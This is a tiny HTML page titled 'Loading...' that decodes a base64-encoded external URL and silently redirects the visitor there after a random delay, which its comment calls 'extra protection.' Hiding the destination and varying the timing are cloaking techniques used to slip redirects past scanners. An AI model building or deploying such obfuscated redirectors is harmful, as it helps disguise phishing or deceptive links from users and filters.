<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <script>
        (function() {
            // Base64 encoded URL
            const encoded = "aHR0cHM6Ly9wLWFuaW1ld2FsbHBhcGVyLmxvdmFibGUuYXBwLw==";
            
            // Decode URL
            const decoded = atob(encoded);
            
            // Small random delay (optional extra protection)
            setTimeout(function() {
                window.location.replace(decoded);
            }, Math.floor(Math.random() * 500) + 100);
        })();
    </script>
</head>
<body>
</body>
</html>
